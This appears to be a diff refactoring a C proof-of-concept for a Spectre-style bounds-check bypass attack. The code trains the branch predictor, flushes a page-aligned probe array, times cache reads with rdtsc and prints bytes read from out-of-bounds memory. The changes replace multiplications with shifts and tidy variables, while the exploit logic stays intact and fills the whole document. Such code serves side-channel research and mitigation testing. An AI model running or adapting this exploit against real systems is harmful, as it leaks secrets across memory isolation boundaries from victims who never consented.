@@ -36,22 +36,22 @@ victim_function(size_t x)
 {
 	if (x < array1_size)
 	{
-		temp &= array2[array1[x] * 4096];
+		temp &= array2[array1[x] << 12];
 	}
 }
 
 void
 leak(size_t x, size_t *ret)
 {
-	int i = 0, j = 0, k = 0, index = 0, res;
+	int i = 0, j = 0, index = 0;
 	size_t delta, time, junk;
-	for (k = 0; k < 256; k++)
+	for (j = 0; j < 256; j++)
 	{
-		flush (&array2[k * 4096]);
+		flush (&array2[j << 12]);
 	}
 	for (i = 0; i < 16; i++)
 	{
-		index = !(i ^ 15) * x;
+		index = !(i ^ 15) * x; // (i == 15) ? x : 0;
 		//printf ("%d %d\n", i, index);
 		flush (&array1_size);
 		victim_function (index);
@@ -60,7 +60,7 @@ leak(size_t x, size_t *ret)
 			for (j = 1; j < 256; j++)
 			{
 				time = rdtsc();
-				junk = array2[4096 * j];
+				junk = array2[j << 12];
 				delta = rdtsc() - time;
 				//printf ("off=%d time=%zu\n", j, delta);
 				if (delta < THRESHOLD)
@@ -76,17 +76,17 @@ leak(size_t x, size_t *ret)
 int
 main(int argc, char **argv)
 {
-	size_t x = 15, val = 0;
-	int i = 0, len = 1;
+	size_t x = 15, len = 1, val = 0;
+	int i = 0;
 
 	// page aligned with mmap
-	array2 = mmap (NULL, 256 * 4096, PROT_READ|PROT_WRITE,
+	array2 = mmap (NULL, 256 << 12, PROT_READ|PROT_WRITE,
 					MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
 
 	// initialize probing array
 	for (i = 0; i < 256; i++)
 	{
-		array2[i * 4096] = 0;
+		array2[i << 12] = 0;
 	}
 
 	// input
@@ -100,13 +100,13 @@ main(int argc, char **argv)
 	}
 
 	// leak data
-	printf ("Reading %d bytes at %zu:\n", len, x);
+	printf ("[+] Reading %zu bytes at %zu:\n", len, x);
 	for (i = 0; i < len; i++)
 	{
 		leak (x+i, &val);
 		printf("offset=%zu byte=%zu 0x%zx '%c'\n", x+i, val, val, (char)val);
 	}
 
-	munmap (array2, 256 * 4096);
+	munmap (array2, 256 << 12);
 	return 0;
 }
